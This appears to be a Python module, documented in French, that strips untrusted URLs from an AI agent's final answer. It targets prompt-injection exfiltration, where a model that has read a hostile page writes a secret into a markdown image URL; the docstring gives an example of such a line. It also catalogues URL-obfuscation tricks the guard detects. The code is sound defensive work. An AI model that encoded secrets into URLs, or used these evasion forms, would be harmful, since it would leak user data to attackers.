"""Garder le CANAL DE LA RÉPONSE : neutraliser, en code, les URL que la réponse d'un run TEINTÉ n'a pas le droit de porter.

Les gardes de la bibliothèque (teinte, `trifecta_guard`, `tool_policy`) regardent les APPELS d'outil. Aucune ne lisait
la réponse finale : un modèle qui a lu une page piégée peut écrire le secret dans l'URL d'une image de sa réponse
(`![logo](https://hôte/p.png?d=SECRET)`), et l'interface qui l'affiche part chercher l'image sans un clic — la forme
en ligne du canal d'EchoLeak. Le banc d'injection (`redteam.py`, attaque `image_markdown`) le mesure : 1 compromis sur 1
dans les trois configurations de la démo 38.

**La règle** (`OutputGuard`, activée par `Agent(output_guard="neutralize")`). Dans un run TEINTÉ seulement, toute URL de
la réponse doit se retrouver MOT POUR MOT dans le transcript, sinon elle est retirée :

* une IMAGE (chargée sans clic : le canal le plus dangereux) n'est gardée que si son URL figure dans un contenu FIABLE
  (le message de l'utilisateur, le prompt système, le résultat d'un outil non `untrusted`) ou si son hôte est dans
  `allowed_hosts` ;
* un LIEN ou une URL nue (il faut un clic) est gardé aussi s'il figure mot pour mot dans le contenu non fiable (une
  citation de source) — `links_from_untrusted=False` le refuse. Une URL CONSTRUITE par le modèle (le secret collé dans
  la requête ou le chemin, encodé, découpé) n'est jamais mot pour mot dans le transcript : elle part.

Les formes couvertes : image et lien en ligne (`![](u)`, `[t](u)`, `[t](<u>)`), références (`[id]: u`, avec l'image
`![x][id]`), lien automatique `<u>`, balises HTML (`src`, `href`, `srcset`, `action`, `poster`, `data`…), URL nue
(`http`, `ftp`, `//hôte`, `www.`), schéma en majuscules, `\\/` échappés, barres inverses lues comme `/` par le
navigateur (`/\\hôte`, `\\\\hôte`), entités numériques avec ou sans point-virgule (`&#104;ttps`, `&#104ttps`), tout
schéma (`javascript:`, `mailto:`). Une URL qui échappe à la lecture structurée est attrapée par le balayage des URL nues.
Une URL fiable est aussi reconnue sous une forme NORMALISÉE (`&amp;`, casse de l'hôte, http/https, `/` final : voir
`_canon`), jamais en changeant son chemin, sa requête ni son hôte. Toutes les expressions régulières sont en temps
linéaire (une réponse du modèle ne doit pas pouvoir bloquer le run).

Contrats. **Fail-closed** : un doute (un contenu non fiable compacté par la mémoire, `TAINT_SENTINEL`) retire l'URL ;
une valeur inconnue de `output_guard` lève à la construction. **Observabilité fail-open** : le texte neutralisé ne dit
JAMAIS l'URL (elle peut contenir le secret) ; l'événement de trace donne le genre, la longueur et une empreinte.

Ce que ça ne couvre PAS (écrit ici pour que personne ne le croie) : un secret écrit en CLAIR dans le texte de la
réponse (l'utilisateur en est le lecteur légitime) ; un canal par SÉLECTION entre des URL préparées par l'attaquant et
présentes dans la page (un bit par choix, `links_from_untrusted=False` le ferme) ; une URL de LECTURE (`lire_page(url)`
portant le secret : c'est un appel d'outil, pas la réponse — l'audit `audit_trifecta` le signale) ; la voix (TTS) ;
l'interface qui rend un Markdown que le modèle n'a pas écrit ; le texte déjà DIFFUSÉ avant la garde si `output_guard`
est mis après coup (le flux est retenu seulement quand la garde est active ET le run déjà teinté à la requête).
"""

from __future__ import annotations

import hashlib
import html
import re
from collections.abc import Iterable, Sequence
from dataclasses import dataclass
from urllib.parse import urlsplit

from .schema import TAINT_SENTINEL, UNTRUSTED_OPEN, Message

__all__ = ["OutputFinding", "OutputGuard", "guard_output", "resolve_output_guard", "split_transcript"]

IMAGE_RETIREE = "[image retirée]"
LIEN_RETIRE = "[lien retiré]"
REFERENCE_RETIREE = "[référence retirée]"

_SCHEMA = re.compile(r"^[a-z][a-z0-9+.\-]*:", re.I)
# Entités numériques AVEC OU SANS point-virgule (HTML5 décode `&#104ttp` comme `http` ; nuit du 11 nov. 2026), zéros
# de tête compris ; les entités nommées exigent le point-virgule (aucune de cette liste n'a de forme historique).
_ENTITE = re.compile(r"&(?:#0*(\d+);?|#[xX]0*([0-9a-fA-F]+);?|(colon|sol|period|bsol|lpar|rpar|quest|equals|num|percnt"
                     r"|commat|lowbar|hyphen|dash|semi|excl|comma|Tab|NewLine|lbrack|rbrack);)", re.I)
_ENTITES_NOMMEES = {"colon": ":", "sol": "/", "period": ".", "bsol": "\\", "lpar": "(", "rpar": ")", "quest": "?",
                    "equals": "=", "num": "#", "percnt": "%", "commat": "@", "lowbar": "_", "hyphen": "-", "dash": "-",
                    "semi": ";", "excl": "!", "comma": ",", "tab": "", "newline": "", "lbrack": "[", "rbrack": "]"}
_ECHAPPE = re.compile(r"\\([!-/:-@\[-`{-~])")
_PONCT_FINALE = ".,;:!?)]}>'\"*_`"

# Une URL « nue » : avec schéma, `//hôte` (relative au schéma) ou `www.hôte.tld`. Le navigateur lit `\` comme `/`
# (`/\hôte`, `\/hôte`, `\\hôte`, `https:\\hôte` : nuit du 11 nov. 2026) ; `\/` échappé en Markdown toléré. Les regards
# en arrière n'autorisent un départ qu'au DÉBUT d'une suite de caractères : temps linéaire, même sur `a.a.a.a…` ou
# une longue suite de barres.
_NUE = re.compile(
    r"(?:(?<![a-z0-9+.\-])[a-z][a-z0-9+.\-]*:[\\/]{2}"
    r"|(?<![\w:/\\])[\\/]{2,}(?=[a-z0-9\-]+(?:\.[a-z0-9\-]+|:\d))"
    r"|(?<![\w/.\\])(?=www\.[a-z0-9\-]+\.[a-z]))"
    r"[^\s<>\"'`]+", re.I)
# `schéma:` seul (javascript:, mailto:, data:…) dans une destination : traité comme une URL ; deux barres, obliques
# ou inverses, aussi.
_DEST_URL = re.compile(r"^(?:[a-z][a-z0-9+.\-]*:|[\\/]{2})", re.I)
# Le navigateur retire tabulations et retours à la ligne PARTOUT dans une URL, contrôles et espaces à ses bords.
_BLANCS_RETIRES = re.compile(r"[\t\n\r]")
_BORDS = "".join(chr(i) for i in range(0x21))

_LIEN_EN_LIGNE = re.compile(
    r"(?P<bang>!?)\[(?P<texte>[^\]\n]{0,300})\]\(\s*(?P<dest><[^>\n]*>|[^()\s]*(?:\([^()\s]*\)[^()\s]*)*)"
    r"(?P<titre>\s+(?:\"[^\"]*\"|'[^']*'|\([^)]*\)))?\s*\)")
# La destination peut être sur la LIGNE SUIVANTE (CommonMark ; nuit du 11 nov. 2026).
_DEFINITION = re.compile(
    r"(?m)^(?P<tete> {0,3}\[(?P<id>[^\]\n]+)\]:[ \t]*(?:\n[ \t]*)?)<?(?P<dest>[^\s>]+)>?(?P<fin>[^\n]*)$")
_AUTOLIEN = re.compile(r"<(?P<dest>(?:[a-z][a-z0-9+.\-]*:|[\\/]{2})[^\s<>]*)>", re.I)
# Temps LINÉAIRE : l'ancienne forme `(?:\s+[^<>]*?)?\s*/?>` était cubique (`<a` + 800 espaces : 0,64 s ; nuit du
# 11 nov. 2026). `/` sépare aussi le nom des attributs (`<img/src=…>`). Limite connue : un `>` DANS une valeur entre
# guillemets coupe la balise ; la suite passe alors par le filet des URL nues.
_BALISE = re.compile(r"<(?P<nom>[a-z][a-z0-9:\-]*)(?P<attrs>[\s/][^<>]*)?>", re.I)
_ATTR_URL = re.compile(
    r"\b(?:src|href|srcset|data|action|poster|background|formaction|xlink:href|cite|ping|content)\s*=\s*"
    r"(?:\"(?P<d>[^\"]*)\"|'(?P<s>[^']*)'|(?P<n>[^\s>]+))", re.I)
_BALISES_IMAGE = {"img", "image", "source", "video", "audio", "picture", "embed", "object", "svg", "input", "track"}


@dataclass(frozen=True)
class OutputGuard:
    """Réglage de la garde de réponse. `Agent(output_guard="neutralize")` = les valeurs par défaut.

    `allowed_hosts` : hôtes (et leurs sous-domaines) dont l'URL passe quelle que soit sa forme — C'EST À L'HÔTE de ne
    nommer que des domaines qui ne rendent pas une requête qu'il ne contrôle pas. `links_from_untrusted` : un LIEN (pas
    une image) qui figure mot pour mot dans le contenu non fiable est gardé (citer une source)."""

    allowed_hosts: tuple[str, ...] = ()
    links_from_untrusted: bool = True

    def __post_init__(self) -> None:
        hotes = tuple(str(h).strip().lower().lstrip(".") for h in self.allowed_hosts)
        if any(not h or "/" in h or ":" in h for h in hotes):
            raise ValueError("allowed_hosts : des noms d'hôte nus (« exemple.fr »), sans schéma, port ni chemin")
        object.__setattr__(self, "allowed_hosts", hotes)


@dataclass(frozen=True)
class OutputFinding:
    """Une URL retirée. JAMAIS l'URL elle-même (elle peut porter le secret) : genre, longueur, empreinte."""

    kind: str          # "image" | "link" | "reference" | "html" | "bare"
    length: int
    digest: str

    def to_dict(self) -> dict[str, object]:
        return {"kind": self.kind, "length": self.length, "digest": self.digest}


def resolve_output_guard(valeur: object) -> OutputGuard | None:
    """`"off"`/`None` → pas de garde ; `"neutralize"` → réglage par défaut ; un `OutputGuard` → tel quel. Autre : erreur
    (fail-closed : une faute de frappe ne désactive pas la garde en silence)."""
    if valeur is None or valeur == "off":
        return None
    if valeur == "neutralize":
        return OutputGuard()
    if isinstance(valeur, OutputGuard):
        return valeur
    raise ValueError(f"output_guard : « off », « neutralize » ou un OutputGuard, pas {valeur!r}")


def split_transcript(messages: Sequence[Message]) -> tuple[str, str]:
    """(contenu FIABLE, contenu NON FIABLE) du transcript. Fiable : prompt système, utilisateur, résultats d'outils non
    encadrés. Non fiable : résultats d'outils encadrés (`UNTRUSTED_OPEN`). Les messages de l'assistant ne comptent dans
    aucun des deux (le modèle ne se cite pas lui-même), ni un résumé de mémoire teinté (le contenu d'origine a disparu :
    ce qu'il cite n'est plus vérifiable, donc refusé)."""
    fiable: list[str] = []
    non_fiable: list[str] = []
    for m in messages:
        contenu = m.content or ""
        if m.role == "tool":
            (non_fiable if UNTRUSTED_OPEN in contenu else fiable).append(contenu)
        elif m.role in ("system", "user") and TAINT_SENTINEL not in contenu:
            fiable.append(contenu)
    return "\n".join(fiable), "\n".join(non_fiable)


def _decoder_entites(texte: str) -> str:
    def un(m: re.Match[str]) -> str:
        try:
            if m.group(1):
                return chr(int(m.group(1)))
            if m.group(2):
                return chr(int(m.group(2), 16))
        except (ValueError, OverflowError):
            return m.group(0)
        return _ENTITES_NOMMEES.get(m.group(3).lower(), m.group(0))
    return _ENTITE.sub(un, texte)


def _normaliser(dest: str) -> str:
    dest = dest.strip().strip("<>").strip()
    dest = _ECHAPPE.sub(r"\1", _decoder_entites(dest))
    return _BLANCS_RETIRES.sub("", dest).strip(_BORDS)


def _hote(url: str) -> str:
    url = _BLANCS_RETIRES.sub("", url).replace("\\", "/")
    u = url if _SCHEMA.match(url) else ("https:" + url if url.startswith("//") else "https://" + url)
    try:
        return (urlsplit(u).hostname or "").lower()
    except ValueError:
        return ""


# Pour la comparaison NORMALISÉE (nuit du 11 nov. 2026 : 6 réponses légitimes sur 12 perdaient une URL fiable).
_JETON_URL = re.compile(r"(?<![a-z0-9+.\-])(?:https?:[\\/]{2}|www\.)[^\s<>\"'`]+", re.I)
_COURRIEL = re.compile(r"(?<![a-z0-9._%+\-])[a-z0-9._%+\-]{1,64}@[a-z0-9\-]{1,63}(?:\.[a-z0-9\-]{1,63}){1,8}", re.I)


def _canon(url: str) -> str | None:
    """La forme d'une URL qui ne garde que ce qui peut porter une donnée VERS L'HÔTE VISÉ, ou `None` (pas de forme
    canonique : la comparaison reste mot pour mot).

    Rendus équivalents : entités HTML (`&amp;`), `\\` lu comme `/`, casse du schéma et de l'hôte, http/https, port par
    défaut, `/` final. JAMAIS : le chemin (sensible à la casse), la requête, le fragment, des identifiants (`user@`),
    un autre schéma. Un `mailto:` sans requête se réduit à l'adresse en minuscules ; avec une requête (`?body=`), pas
    de forme canonique.

    Pourquoi c'est sûr : deux URL de même forme canonique partent vers le MÊME hôte, avec le même chemin et la même
    requête ; ce qui diffère ne transporte rien vers un tiers. Pour un LIEN cité depuis le contenu non fiable, ces
    variantes ajoutent quelques bits au canal par sélection déjà écrit dans les limites ; `links_from_untrusted=False`
    le ferme."""
    u = _BLANCS_RETIRES.sub("", html.unescape(url)).strip(_BORDS).replace("\\", "/")
    if u[:7].lower() == "mailto:":
        adresse = u[7:]
        return "mailto:" + adresse.lower() if adresse and _COURRIEL.fullmatch(adresse) else None
    if u.startswith("//"):
        u = "https:" + u
    elif u[:4].lower() == "www.":
        u = "https://" + u
    try:
        p = urlsplit(u)
        port = p.port
    except ValueError:
        return None
    if p.scheme.lower() not in ("http", "https") or not p.hostname or p.username is not None or p.password is not None:
        return None
    hote = p.hostname.lower() + (f":{port}" if port not in (None, 80, 443) else "")
    return f"{hote}{p.path.rstrip('/')}" + (f"?{p.query}" if p.query else "") + (f"#{p.fragment}" if p.fragment else "")


def _canons(texte: str) -> set[str]:
    """Les formes canoniques des URL et des adresses de courriel d'un texte."""
    trouves: set[str] = set()
    for m in _JETON_URL.finditer(texte):
        jeton = m.group(0)
        while jeton:
            c = _canon(jeton)
            if c:
                trouves.add(c)
            if jeton[-1] not in _PONCT_FINALE:
                break
            jeton = jeton[:-1]
    trouves.update("mailto:" + m.group(0).lower() for m in _COURRIEL.finditer(texte))
    return trouves


def _empreinte(url: str) -> str:
    return hashlib.sha256(url.encode("utf-8", "replace")).hexdigest()[:10]


class _Passe:
    """L'état d'UNE neutralisation : le transcript lu une fois, les URL retirées."""

    def __init__(self, politique: OutputGuard, fiable: str, non_fiable: str) -> None:
        self.p = politique
        self.fiable, self.non_fiable = fiable, non_fiable
        self.canon_fiable, self.canon_non_fiable = _canons(fiable), _canons(non_fiable)
        self.trouvailles: list[OutputFinding] = []

    def permis(self, brut: str, *, image: bool) -> bool:
        url = _normaliser(brut)
        candidats = [url]
        # Ponctuation de phrase collée à l'URL. Bornée : au-delà, l'URL est jugée sans (donc retirée si besoin) — sans
        # borne, `https://x` suivi de 50 000 `)` coûtait 50 000 recherches dans le transcript.
        while url and url[-1] in _PONCT_FINALE and len(candidats) <= 8:
            url = url[:-1]
            candidats.append(url)
        for c in candidats:
            if not c:
                continue
            if c in self.fiable:
                return True
            if not image and self.p.links_from_untrusted and c in self.non_fiable:
                return True
        canons = {k for k in map(_canon, candidats) if k}
        if canons & self.canon_fiable:
            return True
        if not image and self.p.links_from_untrusted and canons & self.canon_non_fiable:
            return True
        hote =_hote(candidats[-1] if candidats[-1] else candidats[0])
        return bool(hote) and any(hote == h or hote.endswith("." + h) for h in self.p.allowed_hosts)

    def decide(self, brut: str, genre: str, *, image: bool) -> bool:
        """True = garder. Sinon enregistre la trouvaille."""
        if self.permis(brut, image=image):
            return True
        self.trouvailles.append(OutputFinding(genre, len(brut), _empreinte(brut)))
        return False


def _nettoyer(texte: str, passe: _Passe) -> str:
    texte = _decoder_entites(texte) if _ENTITE.search(texte) else texte

    # 1. Lien ou image en ligne : on réécrit la construction entière, le texte alternatif reste.
    def en_ligne(m: re.Match[str]) -> str:
        dest = m.group("dest")
        image = bool(m.group("bang"))
        if not (image or _DEST_URL.match(_normaliser(dest))):
            return m.group(0)                                # lien relatif : pas une sortie
        if passe.decide(dest, "image" if image else "link", image=image):
            return m.group(0)
        alt = m.group("texte").strip()
        if image:
            return f"{IMAGE_RETIREE}" + (f" {alt}" if alt else "")
        return f"{alt} {LIEN_RETIRE}".strip()
    texte = _LIEN_EN_LIGNE.sub(en_ligne, texte)

    # 2. Définitions de référence : image si une image les cite, sinon lien. Les étiquettes citées par une image sont
    # relevées UNE fois (`![x][id]`, `![id]`, `![id][]`) : la recherche par définition dans tout le texte était
    # quadratique (6 000 définitions : 8 s ; nuit du 11 nov. 2026).
    citees_par_une_image = {
        _etiquette(r.group(2) if r.group(2) and r.group(2).strip() else r.group(1)) for r in _REF_IMAGE.finditer(texte)}

    def definition(m: re.Match[str]) -> str:
        dest = m.group("dest")
        if not _DEST_URL.match(_normaliser(dest)):
            return m.group(0)
        image = _etiquette(m.group("id")) in citees_par_une_image
        if passe.decide(dest, "reference", image=image):
            return m.group(0)
        return f"{m.group('tete')}{REFERENCE_RETIREE}"
    texte = _DEFINITION.sub(definition, texte)

    # 3. Lien automatique <https://…>.
    def auto(m: re.Match[str]) -> str:
        return m.group(0) if passe.decide(m.group("dest"), "link", image=False) else LIEN_RETIRE
    texte = _AUTOLIEN.sub(auto, texte)

    # 4. Balises HTML : une URL refusée dans un attribut retire la balise ENTIÈRE.
    def balise(m: re.Match[str]) -> str:
        image = m.group("nom").lower() in _BALISES_IMAGE
        garder = True
        for a in _ATTR_URL.finditer(m.group("attrs") or ""):
            valeur = next(g for g in (a.group("d"), a.group("s"), a.group("n"), "") if g is not None)
            # srcset : plusieurs URL. Tabulations et retours à la ligne d'abord retirés, comme le fait le navigateur
            # (sinon `/<tab>/hôte` se découpait en deux morceaux anodins).
            valeur = _BLANCS_RETIRES.sub("", valeur)
            candidats = re.split(r"[\s,]+", valeur) if valeur else []
            for c in candidats:
                if _DEST_URL.match(_normaliser(c)) and not passe.decide(c, "html", image=image):
                    garder = False
        return m.group(0) if garder else (IMAGE_RETIREE if image else LIEN_RETIRE)
    texte = _BALISE.sub(balise, texte)

    # 5. Filet : toute URL nue restante (y compris dans un `url(...)` CSS ou une construction mal formée).
    def une_nue(brut: str) -> str:
        if passe.decide(brut, "bare", image=False):
            return brut
        coeur = brut.rstrip(_PONCT_FINALE)
        return LIEN_RETIRE + brut[len(coeur):]

    def nue(m: re.Match[str]) -> str:
        # Deux URL collées par une virgule sont jugées une à une (nuit du 11 nov. 2026).
        return ",".join(une_nue(morceau) for morceau in _COLLEES.split(m.group(0)))
    return _NUE.sub(nue, texte)


_REF_IMAGE = re.compile(r"!\[([^\]\n]*)\](?:\[([^\]\n]*)\])?")


def _etiquette(texte: str) -> str:
    """L'étiquette d'une référence telle que CommonMark la compare : casse repliée, blancs réduits."""
    return " ".join(texte.split()).casefold()


_COLLEES = re.compile(r",(?=(?:[a-z][a-z0-9+.\-]*:[\\/]{2}|www\.))", re.I)


def guard_output(
    texte: str, messages: Iterable[Message], politique: OutputGuard | None = None,
) -> tuple[str, list[OutputFinding]]:
    """Rend `(texte neutralisé, trouvailles)` pour une réponse d'un run teinté ; `messages` = le transcript.

    Pure et déterministe, sans effet de bord. Appelée seulement quand le run est teinté : sur un run sain, la
    réponse n'est jamais touchée. Idempotente : relancée sur son propre résultat, elle ne trouve plus rien."""
    if not texte:
        return texte, []
    fiable, non_fiable = split_transcript(list(messages))
    passe = _Passe(politique or OutputGuard(), fiable, non_fiable)
    return _nettoyer(texte, passe), passe.trouvailles
